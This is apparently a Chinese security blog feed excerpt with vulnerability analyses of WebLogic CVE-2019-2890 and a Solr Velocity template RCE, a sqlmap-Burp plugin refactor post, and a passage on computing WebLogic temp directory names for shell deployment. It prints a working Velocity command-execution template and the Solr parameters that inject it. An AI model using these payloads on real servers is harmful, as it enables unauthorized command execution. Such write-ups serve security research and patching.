alt="ceClient变量的赋值"></p><p><strong>第三个问题是恶意对象没有被加密</strong>。这是因为在调用<code>EncryptionUtil.encrypt</code>方法加密时，会根据<code>Kernel.isServer()</code>为<code>true</code>时才会进行加密，否则返回原数据。<br>因此加密之前需要调用<code>KernelStatus.setIsServer(true)</code>设置状态为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/00CBD49C-24DD-45CB-8B96-5C96F59D2543.png" alt="加密时的判断"></p><p><strong>第四个问题，加密时需要<code>SerializedSystemIni.dat</code>文件。</strong> 我们需要目标服务器weblogic当前使用域下该文件放到我们poc的根目录。这也是官方将这个漏洞划分为需要认证的原因。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/0E16C9FC-DF1D-4162-8551-A99F81CDB316.png" alt="加密时需要SerializedSystemIni.dat文件"></p><p>解决完这四个问题，就可以将<code>PersistenContext</code>对象反序列化为文件了。最后通过t3协议发送反序列化数据给Weblogic，即可执行任意命令。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B861234A-24EA-49C9-BAD8-B2E0749EF2E3.png" alt="序列化PersistenContext对象为文件"><br><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/364E764C-5247-4FB5-9225-DDD9290E9660.png" alt="漏洞利用演示"></p><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>通过对比，发现最新补丁在反序列化时，使用<code>WSFilteringObjectInputStream</code>对要反序列化的对象进行过滤。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/751120F6-1CBF-46CE-B226-A4B45C1D29F1.png" alt="补丁修复处"></p><p><code>WSFilteringObjectInputStream</code>实现了Weblogic下的过滤接口 <code>FilteringObjectInputStream</code>。在其<code>resolveClass</code>方法中，检查要反序列化的类是不是<code>Subject</code>的子类，不是则会抛出一个非法类异常，反序列化终止！</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/597CFF7E-38BA-4A02-B977-53D5B3DE5282.png" alt="补丁修复的方式"></p><h2 id="0x06-分析总结"><a href="#0x06-分析总结" class="headerlink" title="0x06 分析总结"></a>0x06 分析总结</h2><p>这个漏洞需要满足以下两个条件，才能触发成功,较为鸡肋。</p><ol><li>Weblogic开启t3协议</li><li>可以获取到<code>SerializedSystemIni.dat</code>文件</li></ol><p>但是在实际环境中，如果部署在weblogic的站点存在<code>任意文件下载</code>或者<code>任意文件读取</code>，那么配合上该漏洞即可执行任意命令。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.oracle.com/security-alerts/cpuoct2019.html" target="_blank" rel="noopener">Oracle Critical Patch Update Advisory - October 2019</a></li><li><a href="https://mp.weixin.qq.com/s/BW1d_NTsmXoSoOYAt8T2RQ" target="_blank" rel="noopener">WebLogic 反序列化漏洞(CVE-2019-2890)分析</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞背景&quot;&gt;&lt;a href=&quot;#0x01-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞背景&quot;&gt;&lt;/a&gt;0x01 漏洞背景&lt;/h2&gt;&lt;p&gt;在WebLogic官方发布的10月份安全补丁中，包含了由Venustech ADLa
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="weblogic" scheme="http://gv7.me/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Apache solr Velocity模版远程命令执行漏洞分析</title>
    <link href="http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/"/>
    <id>http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/</id>
    <published>2019-10-31T14:00:00.000Z</published>
    <updated>2019-11-01T07:10:28.332Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>2019年10月31日，一个Solr Velocity模板远程命令执行的POC被公开到Github。经过分析测试，该POC在Solr的多个版本测试成功，包含最新版本，所以该漏洞目前处于0day状态。由于Solr默认未开启登录认证，只需请求<code>/节点名/config</code>,将配置项<code>params.resource.loader.enabled</code>设置为<code>true</code>，再构造链接即可让Solr中的<code>Velocity</code>模版引擎渲染传入的<code>恶意模版</code>，造成命令执行。下面我们来具体分析漏洞细节！</p><h2 id="0x02-知识储备"><a href="#0x02-知识储备" class="headerlink" title="0x02 知识储备"></a>0x02 知识储备</h2><p><code>Velocity</code>是一个基于Java的模板引擎，简单来说就是可以将模版渲染成html页面。下面以一个小demo来演示使用<code>Velocity</code>如何渲染出<code>test by chixiao lab</code>,方便大家快速理解<code>Velocity</code>的功能和使用。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/86DBE94C-81E6-4CE9-AD4F-084638F2106C.png" alt="一个使用Velocity来渲染模版的小Demo"></p><p>如果我们的模版<code>test.vm</code>内容改如下时，那么<code>Velocity</code>将会执行<code>id</code>命令，并显示执行结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;)</span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))</span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))</span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;))</span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">    $str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>所以某个应用以<code>Velocity</code>作为模版渲染引擎，如果要渲染的模版内容用户可控的话，那就可以构造恶意模版来执行任意命令。本次Solr漏洞就是这种情况！</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面我们在<code>Solr 8.2.0</code>上以公开的POC触发的漏洞链进行分析。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1F69B8C0-F828-494C-8166-D7AFD4AE613E.png" alt="公开的POC"></p><p>Solr在查询数据结束后，会通过<code>wt</code>参数的值来确定数据返回的格式，可以是<code>XML</code>、<code>JSON</code>、<code>CSV</code>,<code>Velocity模版渲染</code>等等。本次漏洞正是出现在查询结果用<code>Velocity模版渲染</code>。</p><p>从代码层面看，Solr会根据<code>wt</code>值，创建对应的类型的<code>QueryResponseWriter</code>来将查询数据处理成对应的格式，最后将数据<code>write()</code>到客户端。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/FE4E7C2B-87CA-4721-BBA2-945B06B92689.png" alt="根据wt确定对应的数据处理对象"></p><p>由于我们这里设置的是<code>wt=velocity</code>,故<code>QueryResponseWriter</code>类型为<code>VelocityResponseWriter</code>。我们在<code>solr-velocity-8.2.0.jar</code>包的<code>VelocityResponseWriter.write()</code>方法打断点，作为漏洞分析的开始位置。</p><p>首先Solr会先创建一个Velocity模版引擎对象<code>engine</code>，跟进<code>createEngine()</code>方法。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1381E002-323E-4299-9A8B-F1E6A1A03F8E.png" alt="创建解析引擎对象"></p><p>发现当设置<code>&quot;params.resource.loader.enabled&quot;: &quot;true&quot;</code>时，属性<code>this.paramsResourceLoaderEnabled</code>的值为<code>true</code>，程序将创建一个参数资源加载器对象，也就是模版内容将从前端传来的参数中加载（PS:知识储备的案例是从文件加载）。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8C442324-CF12-45EB-9FAE-E6BC63505BB8.png" alt="创建参数资源加载器"></p><p>继续跟进<code>SolrParamResourceLoader</code>类的构造方法，解析了前端传来的所有参数，并对<code>v.template.</code>开头的参数进行处理。我们请求的参数为<code>...&amp;v.template=custom&amp;v.template.custom=恶意模版内容</code>,所以<code>put</code>进入<code>templates</code>模版<code>map</code>的<code>key</code>是<code>custom.vm</code>,<code>value</code>就是我们指定的<code>恶意模版内容</code>。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8D6900E0-292A-4D8E-B682-99B2D9B92608.png" alt="将前端传入的恶意模版保存为custom.vm"></p><p>之后在获取模版对象时,将前端传入的参数<code>v.template</code>值拼接<code>.vm</code>，也就<code>custom.vm</code>，作为要渲染的模版名。而<code>custom.vm</code>正是我们上一步传入的恶意模版。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CD9FDCEB-B8AE-4659-8D92-08BFAA7F8896.png" alt="使用custom.vm创建模版对象"></p><p>然后我们重新回到<code>write()</code>方法，不管<code>wrapResponse</code>变量为<code>true</code>还是<code>false</code>，恶意模版都被传入<code>merge()</code>进行合并渲染，至此漏洞触发。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CA7EFD0E-CAB8-437E-BDE4-0C683CEE5452.png" alt="合并解析模版"><br><img src="/articles/2019/apache-solr-velocity-rce-20191031/E339A09C-32EC-43B5-8E47-F38F5E573315.png" alt="漏洞触发效果"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">s00py公开的POC</a></li><li><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞背景&quot;&gt;&lt;a href=&quot;#0x01-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞背景&quot;&gt;&lt;/a&gt;0x01 漏洞背景&lt;/h2&gt;&lt;p&gt;2019年10月31日，一个Solr Velocity模板远程命令执行的POC被公开
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="solr" scheme="http://gv7.me/tags/solr/"/>
    
  </entry>
  
  <entry>
    <title>重构sqlmap4burp插件</title>
    <link href="http://gv7.me/articles/2019/refactoring-sqlmap4burp/"/>
    <id>http://gv7.me/articles/2019/refactoring-sqlmap4burp/</id>
    <published>2019-09-02T12:18:14.000Z</published>
    <updated>2019-09-02T18:42:18.324Z</updated>
    
    <content type="html"><![CDATA[<p>其实联动sqlmap与burp的插件挺多的，有<a href="https://code.google.com/p/gason/" target="_blank" rel="noopener">gson</a>,<a href="https://github.com/portswigger/co2" target="_blank" rel="noopener">CO2</a>,<a href="https://github.com/portswigger/sqli-py" target="_blank" rel="noopener">sqli-py</a>等等。但我独爱<a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">sqlmap4burp</a>,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。</p><a id="more"></a><p><code>sqlmap4burp</code>项目作者已经很久没有维护了，于是打算对其进行重构。新插件就叫<code>sqlmap4burp++</code>，表示感谢原作者的思路。<code>sqlmap4burp++</code>将<code>兼容更多操作系统</code>，<code>操作更加简单</code>，<code>界面更加简洁</code>！</p><h2 id="0x01-重构之路"><a href="#0x01-重构之路" class="headerlink" title="0x01 重构之路"></a>0x01 重构之路</h2><p>下面简单记录下重构做的一些小工作。</p><h3 id="1-1-去除多余依赖"><a href="#1-1-去除多余依赖" class="headerlink" title="1.1 去除多余依赖"></a>1.1 去除多余依赖</h3><p>原插件依赖<code>commons-io-&lt;version&gt;.jar</code>,<code>commons-langs-&lt;version&gt;.jar</code>这两个jar。但查看代码只是为了可以使用<code>FileUtils.writeByteArrayToFile()</code>和<code>StringUtils.isNoneBlank()</code>两个方法。<code>sqlmap4burp++</code>使用原生Java代码实现，让插件更轻量易编译。</p><h3 id="1-2-去除JTab控件"><a href="#1-2-去除JTab控件" class="headerlink" title="1.2 去除JTab控件"></a>1.2 去除JTab控件</h3><p>现在的Burp插件很丰富，Burp suite JTab控件太多界面会显得特别臃肿。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-tab.png" alt="sqlmap4burp的JTab控件"></p><p>考虑了下该插件并非特别需要JTab面板来添加sqlmap的配置命令，于是去除JTab控件该换成如下的弹窗。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-plus-plus-dlg.png" alt="sqlmap4burp++的弹框控件"></p><h3 id="1-3-多系统支持"><a href="#1-3-多系统支持" class="headerlink" title="1.3 多系统支持"></a>1.3 多系统支持</h3><p>插件会自动将Burp的request数据包保存为<code>xxx.req</code>到java临时目录，而多系统支持无非就是<strong>在目标系统下，能弹出命令行窗口并执行我们的<code>sqlmap -r xxx.req</code>命令</strong>,但各个系统实现的方式都有所不同!</p><h4 id="1-3-1-Windows"><a href="#1-3-1-Windows" class="headerlink" title="1.3.1 Windows"></a>1.3.1 Windows</h4><p>Windows实现比较简单，只需要将sqlmap命令保存为bat脚本（sqlmap4burp.bat），然后执行以下命令：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c <span class="built_in">start</span> sqlmap4burp.bat</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">cmds.add(<span class="string">"start"</span>);</span><br><span class="line">String batFilePath = Util.makeBatFile(<span class="string">"sqlmap4burp.bat"</span>,command); <span class="comment">//生成bat文件</span></span><br><span class="line">cmds.add(batFilePath);</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><h4 id="1-3-2-Mac-OS-X"><a href="#1-3-2-Mac-OS-X" class="headerlink" title="1.3.2 Mac OS X"></a>1.3.2 Mac OS X</h4><p>Mac下我们可以编写如下<code>osascript</code>脚本来调用Terminal并让它执行sqlmap命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tell application &quot;Terminal&quot;</span><br><span class="line">activate</span><br><span class="line">do script &quot;sqlmpa.py -r xxx.req&quot;</span><br><span class="line">end tell</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"osascript"</span>);</span><br><span class="line">cmds.add(<span class="string">"-e"</span>);</span><br><span class="line">String cmd = <span class="string">"tell application \"Terminal\" \n"</span> +</span><br><span class="line">        <span class="string">"        activate\n"</span> +</span><br><span class="line">        <span class="string">"        do script \"%s\"\n"</span> +</span><br><span class="line">        <span class="string">"end tell"</span>;</span><br><span class="line">cmds.add(String.format(cmd,command));</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>这里需要注意两点：</p><ul><li>第一次运行，mac会提示是否允许外部程序执行osscript，记得允许！</li><li>有时莫名其妙调用osascript不成功，我们需要确保Terminal是运行状态，如果已经是运行状态，可以重启下。</li></ul><h4 id="1-3-3-Linux"><a href="#1-3-3-Linux" class="headerlink" title="1.3.3 Linux"></a>1.3.3 Linux</h4><p>Linux下想实现弹出命令行窗口同时执行命令，我尝试了很多方法，但是都没有成功的。比较接近想要效果的方法是先将sqlmap命令写到shell脚本中（<code>sqlmap4burp.sh</code>）。然后执行如下命令来运行<code>sqlmap4burp.sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -t <span class="string">"sqlmap4burp"</span> -x bash -c <span class="string">"sh ./tmp/sqlmap4burp.sh;exec bash;"</span></span><br></pre></td></tr></table></figure><p>但使用代码去执行的时候并没有弹出<code>Terminal</code>。大家如果有解决方法，可以Fork <a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">sqlmap4burp++</a>项目贡献代码，或者发送想法到我的邮箱root#gv7.me。</p><p>目前采用临时的方法：先弹出<code>Terminal</code>窗口，然后将生成好的sqlmap命令复制剪贴板，最后手工在弹出的窗口中粘贴并执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"/bin/sh"</span>);</span><br><span class="line">cmds.add(<span class="string">"-c"</span>);</span><br><span class="line">cmds.add(<span class="string">"gnome-terminal"</span>);</span><br><span class="line">Util.setSysClipboardText(command); <span class="comment">//sqlmap命令到剪贴板</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>完整代码请移步项目地址：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><h2 id="0x02-插件演示"><a href="#0x02-插件演示" class="headerlink" title="0x02 插件演示"></a>0x02 插件演示</h2><p>插件已经在如下系统测试成功：</p><ul><li>Windows：7,10</li><li>Mac OSX：Mojave 10.14.5</li><li>Linux：Kali2019.2</li></ul><p>请FQ观看演示，或者直接访问：<a href="https://www.youtube.com/watch?v=1RWVkztssvw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=1RWVkztssvw</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/1RWVkztssvw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="0x03-参考项目"><a href="#0x03-参考项目" class="headerlink" title="0x03 参考项目"></a>0x03 参考项目</h2><ul><li><a href="https://github.com/blueroutecn/Burpsuite4Extender" target="_blank" rel="noopener">https://github.com/blueroutecn/Burpsuite4Extender</a></li><li><a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实联动sqlmap与burp的插件挺多的，有&lt;a href=&quot;https://code.google.com/p/gason/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gson&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/co2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CO2&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/sqli-py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqli-py&lt;/a&gt;等等。但我独爱&lt;a href=&quot;https://github.com/difcareer/sqlmap4burp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqlmap4burp&lt;/a&gt;,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>weblogic“伪随机”目录生成算法探究</title>
    <link href="http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/"/>
    <id>http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/</id>
    <published>2019-08-20T03:33:21.000Z</published>
    <updated>2019-08-27T16:34:00.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>我们在渗透测试过程中，可以很容易发现weblogic的    <code>server name</code>一旦被修改，其web应用有一个目录就会发生改变，导致我们在部署war拿shell时受阻。</p><p>比如bea_wls_internal这个weblogic自带web应用的web目录物理路径为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_internal\9j4dqk\war</strong></p><p>PS：为了后面的讨论，这里统一下概念，域名为<code>base_domain</code>,<code>server name</code>为<code>AdminServer</code>,web应用名为<code>bea_wls_internal</code>,伪随机目录为<code>9j4dqk</code>。</p><p>这时如果<code>server name</code>修改为<code>c0ny1</code>的话，经过测试其伪随机目录会变成<code>qn64ct</code>，即该web应用物理路径变为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\c0ny1\tmp_WL_internal\bea_wls_internal\qn64ct\war</strong></p><h2 id="0x02-真随机-or-伪随机？"><a href="#0x02-真随机-or-伪随机？" class="headerlink" title="0x02 真随机 or 伪随机？"></a>0x02 真随机 or 伪随机？</h2><p>在此前我一直以为改目录是随机的无法。直到我做了下面的测试，将两个域的<code>server name</code>都改为<code>c0ny1</code>。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test1.png" alt="bea_wls_internal随机目录变化"></p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test2.png" alt="bea_wls9_async_reponses随机目录变化"></p><p>发现两个域下相同web应用的随机目录名相同，这说明随机数目录其实是伪随机，它是有算法来生成的。<strong>而通过结果我们很容易就判断出该随机数和域名无关，和<code>server name</code>与<code>application name</code>有关！</strong></p><h2 id="0x03-探究生成算法"><a href="#0x03-探究生成算法" class="headerlink" title="0x03 探究生成算法"></a>0x03 探究生成算法</h2><p>于是我打算跟踪下weblogic源码，扒出负责生产伪随机数的算法函数。由于其生成伪随机目录在weblogic未启动完全情况下，故通过weblogic配置的调试比较难。这种情况下更好的思路是插桩，但要插哪个函数的桩呢？</p><p>我在翻阅weblogic的源码（weblogic.jar）时，着重关注文件操作和部署接口的代码，发现了一个相关性很大的方法。该函数就在weblogic的路径工具类（weblogic.application.utils.PathUtils）中。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-code.png" alt="相关方法"></p><p>在判断不失误的情况下，我们只要知道其传入的参数值就知道改函数如何使用了。为此我编写了如下代码，使用javassist将打印函数参数值的代码注入到该函数中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">changeMethode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool.getDefault().insertClassPath(<span class="string">"/Users/c0ny1/IdeaProjects/weblogic-path-test/lib/weblogic.jar"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取需要修改的类</span></span><br><span class="line">            CtClass cls = ClassPool.getDefault().getCtClass(<span class="string">"weblogic.application.utils.PathUtils"</span>);</span><br><span class="line">            <span class="comment">// 获取类中的printTest方法</span></span><br><span class="line">            CtMethod m = cls.getDeclaredMethod(<span class="string">"generateTempPath"</span>);</span><br><span class="line">            <span class="comment">// 在方法中插入新的代码</span></span><br><span class="line">            <span class="comment">//m.insertBefore("System.out.println($1 + File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36));") ;</span></span><br><span class="line">            <span class="comment">// 修改该方法的内容</span></span><br><span class="line">            m.setBody(<span class="string">"&#123;StringBuffer var3 = new StringBuffer();\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($1 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append($1);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($2 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($2);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($3 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($3);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        String str = $2 + java.io.File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p1:\" + $1);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p2:\" + $2);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p3:\" + $3);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] \" + str);\n"</span> +</span><br><span class="line">                    <span class="string">"        return str;&#125;"</span>);</span><br><span class="line">                    </span><br><span class="line">            <span class="comment">// 解除代码锁定,恢复可编辑状态</span></span><br><span class="line">            cls.defrost();</span><br><span class="line">            <span class="comment">// 写出到外存中</span></span><br><span class="line">            cls.writeFile(<span class="string">"./PathUtils.class"</span>);</span><br><span class="line">            <span class="comment">// testJarClass.writeFile(other path);</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        changeMethode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/inject-code.png" alt="被注入代码后的PathUtils类"></p><p>将插桩后的PathUtils类通过Winrar软件覆盖weblogic.jar原来的类，然后重新启动weblogic，即可从控制台查看到如下：</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-run-result.png" alt="weblogic重启运行结果"></p><p>由此我们知道web应用bea_wls9_async_response的随机目录被生成时，该函数被调用并传入<code>server name</code>和<code>application name</code>，这也验证我们之前的猜想。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generateTempPath(<span class="string">"c0ny1"</span>,<span class="string">"bea_wls9_async_response"</span>,<span class="string">"bea_wls9_async_response.war"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-伪随机目录生成代码编写"><a href="#0x04-伪随机目录生成代码编写" class="headerlink" title="0x04 伪随机目录生成代码编写"></a>0x04 伪随机目录生成代码编写</h2><p>到这里写计算伪随机目录生成程序就是很简单的事了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 